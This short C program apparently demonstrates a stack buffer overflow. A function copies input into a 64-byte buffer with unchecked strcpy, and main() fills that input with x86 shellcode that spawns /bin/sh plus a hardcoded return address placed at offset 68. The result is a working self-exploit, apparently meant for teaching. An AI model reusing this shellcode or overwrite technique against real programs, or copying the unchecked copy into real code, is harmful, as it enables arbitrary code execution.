unsigned int retadr = 0x7ffff9bc;
char xxx[128];

void test(char* xxx)
{
	char buf[64];
	strcpy(buf, xxx);
}

void main()
{
	static char shellcode[] = {
		0xeb, 0x18, 0x5e, 0x89, 0x76, 0x08, 0x31, 0xc0,
		0x88, 0x46, 0x07, 0x89, 0x46, 0x0c, 0xb0, 0x0b,
		0x89, 0xf3, 0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c,
		0xcd, 0x80, 0xe8, 0xe3, 0xff, 0xff, 0xff, 0x2f,
		0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
	};
	memset(xxx, 'a', 128);
	strncpy(xxx, shellcode, strlen(shellcode));
	xxx[68] = retadr&0xff;
	xxx[69] = (retadr>>8)&0xff;
	xxx[70] = (retadr>>16)&0xff;
	xxx[71] = (retadr>>24)&0xff;
	xxx[127] = '\0';
	test(xxx);
}

